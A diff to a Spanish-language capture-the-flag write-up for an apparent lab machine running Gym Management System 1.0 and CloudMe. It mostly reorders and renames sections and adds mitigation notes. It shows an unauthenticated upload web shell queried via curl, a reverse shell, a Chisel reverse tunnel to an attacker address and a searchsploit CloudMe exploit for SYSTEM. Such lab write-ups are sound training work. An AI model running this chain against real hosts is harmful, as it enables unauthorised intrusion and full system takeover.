@@ -36,7 +36,27 @@ curl -s http://<IP>:8080/ | head -50
 
 La web es «mrb3n's Bro Hut», un sitio de gimnasio con `packages.php`, `facilities.php` y `upload.php`. El pie o el HTML revelan el CMS: **Gym Management System 1.0**.
 
-## Acceso inicial
+## Enumeración
+
+```bash
+netstat -ano | findstr LISTENING
+```
+
+```text
+127.0.0.1:8888   CloudMe
+```
+
+CloudMe solo escucha en loopback, así que hay que traerlo al atacante. Con Chisel:
+
+```bash
+# atacante
+./chisel server -p 8000 --reverse
+
+# víctima
+.\chisel.exe client <IP_ATACANTE>:8000 R:8888:127.0.0.1:8888
+```
+
+## Foothold
 
 El CMS permite subir ficheros sin sesión en el endpoint de subida:
 
@@ -57,27 +77,12 @@ curl -s "http://<IP>:8080/upload/shell.php?c=whoami"
 
 Reverse shell con `powershell` o `nc.exe` desde el propio servidor; se estabiliza y se lee la flag de usuario en `C:\Users\shaun\Desktop\`.
 
-## Enumeración local
+## Movimiento lateral
 
-```bash
-netstat -ano | findstr LISTENING
-```
+- No aplica: la cadena se resuelve en un único host, sin salto lateral.
+- Ver «Escalada de privilegios» para el paso de usuario a administrador.
 
-```text
-127.0.0.1:8888   CloudMe
-```
-
-CloudMe solo escucha en loopback, así que hay que traerlo al atacante. Con Chisel:
-
-```bash
-# atacante
-./chisel server -p 8000 --reverse
-
-# víctima
-.\chisel.exe client <IP_ATACANTE>:8000 R:8888:127.0.0.1:8888
-```
-
-## Escalada a SYSTEM
+## Escalada de privilegios
 
 ```bash
 searchsploit CloudMe 1.11.2
@@ -91,9 +96,22 @@ python3 cloudme_exploit.py
 
 CloudMe corre como servicio, así que la shell vuelve como **SYSTEM** y la flag de root está en `C:\Users\Administrator\Desktop\`.
 
-## Lecciones
+## Evidencia
+
+- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
+- Los valores reales viven en `private/` y no se publican.
+
+## Lecciones aprendidas
 
 - Un CMS antiguo con subida sin autenticación es shell directa; el PHP 7.4.6 sobre Apache de Windows no añade protección.
 - Los servicios que solo escuchan en loopback no son inalcanzables: con una shell ya se puede hacer port forwarding.
 - Software de terceros desactualizado en el escritorio del usuario suele correr como servicio: de usuario a SYSTEM en un paso.
 - Detección: POST a `upload.php` con extensión ejecutable, ficheros nuevos en el directorio de subidas y procesos `powershell` hijos de `httpd`.
+
+## Mitigaciones y detección
+
+- Actualizar el CMS, poner un WAF delante y revisar la integridad de los ficheros.
+
+## Referencias
+
+- [rop-stack](../../../knowledge/pwn/rop-stack.md)
